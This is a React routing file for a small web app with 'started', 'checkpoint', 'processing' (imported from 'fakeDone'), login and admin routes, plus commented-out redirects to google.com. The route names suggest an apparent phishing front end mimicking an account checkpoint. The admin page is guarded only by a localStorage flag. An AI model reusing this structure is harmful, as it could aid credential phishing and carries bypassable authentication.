import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
import "./App.css";
import NotFound from "./pages/notFound";
import Started from "./pages/Started";
import ClassUser from "./pages/fakeDone";
import AuthCode from "./pages/authCode";
import AdminPage from "./pages/admin";
import Login from "./pages/login";
function PrivateRoute({ children }) {
  return localStorage.getItem("logined") === "true" ? (
    <>{children}</>
  ) : (
    <Navigate to="/login" />
  );
}

function App() {
  return (
    <BrowserRouter>
      <div id="app">
        <Routes>
          {/* <Route path='/' element={<meta http-equiv="refresh" content="0; url=https://www.google.com/"/>} /> */}
          <Route path="started/" element={<Started />} />
          <Route path="checkpoint/:userID" element={<AuthCode />} />
          <Route path="processing/:userID" element={<ClassUser />} />
          <Route path="login" element={<Login />} />
          <Route
            path="/admin"
            element={
              <PrivateRoute>
                <AdminPage />
              </PrivateRoute>
            }
          />
          {/* <Route path="*" element={<meta http-equiv="refresh" content="0; url=https://www.google.com/"/>} /> */}
        </Routes>
      </div>
    </BrowserRouter>
  );
}


export default App;
